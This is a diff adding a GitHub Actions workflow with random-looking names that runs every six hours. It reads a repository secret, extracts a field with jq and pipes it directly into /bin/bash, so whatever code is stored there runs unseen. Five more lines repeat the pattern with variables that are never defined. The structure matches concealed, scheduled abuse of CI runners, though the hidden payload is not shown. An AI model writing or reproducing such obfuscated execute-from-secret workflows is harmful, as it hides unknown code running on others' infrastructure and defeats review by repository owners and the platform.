@@ -1,0 +1,22 @@
+name: zhehejinan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhehejinan
+        env:
+          g904: ${{ secrets.g904 }}
+        run: |
+          echo $g904 | jq -r .pjag8982 | /bin/bash
+          echo $xs5 | jq -r .tfzsr7 | /bin/bash
+          echo $th822 | jq -r .ucyvs31783 | /bin/bash
+          echo $plnva742 | jq -r .vgw37 | /bin/bash
+          echo $yao12 | jq -r .vit36080 | /bin/bash
+          echo $wrf76306 | jq -r .ft449 | /bin/bash
+
